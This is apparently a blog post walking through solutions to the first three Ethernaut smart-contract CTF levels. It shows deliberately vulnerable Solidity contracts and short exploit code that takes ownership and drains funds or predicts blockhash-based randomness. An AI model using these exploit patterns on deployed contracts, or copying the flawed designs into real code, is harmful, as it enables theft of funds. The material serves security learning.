##########################
Let's play some Ethernauts
##########################
:date: 2023-07-11
:summary: let's get back into this 'smart contract development' thing
:tags: programming
:author: capu
:featured_image:

Context
=======
`Ethernaut <https://ethernaut.openzeppelin.com/>`_ is a capture the flag smart contract security
game inspired by `overthewire wargames <https://overthewire.org/wargames/>`_ (which are a lot of fun
as well).

It's been a long time since I got any real amount of work done on smart contracts, and I want to get
back into it. Perhaps even focus more on security & auditing this time around.

Plus, I'm in my *year of resourcefulness* so I want to have my skills & scripts ready in case I need
them.

Plumbing
========
After going down a very uninteresting rabbit hole of trying to replicate the exact same environment
locally that's available on the sepolia network, so I can have solutions that work against the
canonical Ethernaut contracts and also run offline, I decided to just fork off from `some anon's work <https://github.com/puffdood/ethernaut_foundry>`_ and `off I went <https://github.com/juanpcapurro/ethernaut-foundry>`_

The repo just runs the contracts in some Foundry tests. It's not clean by any means, but for once I
want to get to work on the interest stuff instead of spending an entire day sweeping the floor. So
let's get to it:

1: Fallback
===========

code
----

.. code::

    pragma solidity ^0.8.13;
    contract Fallback {
        mapping(address => uint256) public contributions;
        address payable public owner;

        constructor() {
            owner = payable(msg.sender);
            contributions[msg.sender] = 1000 * (1 ether);
        }

        modifier onlyOwner() {
            require(msg.sender == owner, "caller is not the owner");
            _;
        }

        function contribute() public payable {
            require(msg.value < 0.001 ether);
            contributions[msg.sender] += msg.value;
            if (contributions[msg.sender] > contributions[owner]) {
                owner = payable(msg.sender);
            }
        }

        function getContribution() public view returns (uint256) {
            return contributions[msg.sender];
        }

        function withdraw() public onlyOwner {
            owner.transfer(address(this).balance);
        }

        receive() external payable {
            require(msg.value > 0 && contributions[msg.sender] > 0);
            owner = payable(msg.sender);
        }
    }

solution
--------

At first it looks simple enough, but there's a small caveat: the fallback function writes to
storage, so the 2300 gas ``transfer`` forwards are not enough, and you have to use an explicit
``call``

.. code::

    target.contribute{value: 100 wei}();
    payable(target).call{value: 100 wei, gas: 30000}(bytes(""));
    target.withdraw();

Fallout
=======

Code
----
.. code::

    contract Fallout {
        mapping(address => uint256) public allocations;
        address payable public owner;

        /* constructor */
        function Fal1out() public payable {
            owner = payable(msg.sender);
            allocations[owner] = msg.value;
        }

        modifier onlyOwner() {
            require(msg.sender == owner, "caller is not the owner");
            _;
        }

        function allocate() public payable {
            allocations[msg.sender] += msg.value;
        }

        function sendAllocation(address payable allocator) public {
            require(allocations[allocator] > 0);
            allocator.transfer(allocations[allocator]);
        }

        function collectAllocations() public onlyOwner {
            payable(msg.sender).transfer(address(this).balance);
        }

        function allocatorBalance(address allocator) public view returns (uint256) {
            return allocations[allocator];
        }
    }

Solution
--------
This one was harder before solidity 0.5. Back then, the constructor was defined as a function with
the same name as the contract. It was entirely possible to rename the contract but forget to rename
the constructor, and then you had a function open to the world where some important initialization
probably happened.

.. code::

    target.Fal1out();
    target.collectAllocations();


CoinFlip
========

Code
----
.. code::

    contract CoinFlip {
        uint256 public consecutiveWins;
        uint256 public lastHash;
        uint256 public FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        constructor() {
            consecutiveWins = 0;
        }

        function flip(bool _guess) public returns (bool) {
            uint256 blockValue = uint256(blockhash(block.number - 1));

            if (lastHash == blockValue) {
                revert();
            }

            lastHash = blockValue;
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;

            if (side == _guess) {
                consecutiveWins++;
                return true;
            } else {
                consecutiveWins = 0;
                return false;
            }
        }
    }

Solution
--------
This one is probably harder from the web interface, since the 'hack' is to pre-compute the same
logic the contract executes in order to predict the result, and it's easiest to do so from a smart
contract.

This being a foundry test and all, I had to use the cheatcodes to make the block number advance:

.. code::

    function predictFlip() private view returns (bool){
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        return coinFlip == 1;
    }

    function solution(CoinFlip target) internal virtual {
        for (uint i = 0 ; i < 10 ; i++){
            target.flip(predictFlip());
            vm.roll(block.number+1);
        }
    }

This was fun. I should have a few more done by next week.
